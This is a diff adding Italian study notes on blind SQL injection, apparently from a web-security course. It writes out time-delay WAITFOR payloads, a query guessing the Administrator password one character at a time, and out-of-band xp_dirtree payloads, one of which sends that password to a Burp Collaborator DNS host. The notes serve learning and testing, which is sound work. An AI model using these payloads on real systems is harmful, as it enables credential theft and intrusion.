@@ -73,6 +73,19 @@ triggering conditional responses -> esempio: considerare un app che nelle richie
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
 check risposta per capire se la lettera della password è maggiora di t o minore, così facendo è possibile trovare la password
 
+time delay
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+
+time delay per trovare un carattere alla volta
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+
+OAST techniques
+genera DNS query spesso
+con collaborator si monta un dns server e ricevere le risposte
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--         -> per confermare che si possono fare richieste out of bound
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--    -> per mandare dati out of bound
+
 SECOND ORDER SQL INJECTION
 
 input viene salvato nel database e magari viene richiamato in altre funzioni ma non immediatamente, esempio stored xss
